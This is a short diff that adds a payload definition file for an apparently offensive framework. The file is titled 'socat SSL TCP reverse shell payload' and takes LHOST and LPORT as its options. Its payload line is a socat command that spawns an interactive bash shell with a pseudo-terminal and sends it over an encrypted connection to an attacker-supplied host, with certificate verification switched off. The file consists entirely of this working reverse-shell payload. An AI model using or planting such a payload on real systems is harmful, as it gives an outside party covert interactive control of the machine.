@@ -1,0 +1,5 @@
+title=socat SSL TCP reverse shell payload
+info=fully interactive socat shell
+required_opts=LHOST;LPORT
+connector=reverse_tcp_socat_ssl
+payload=socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl:LHOST:LPORT,verify=0
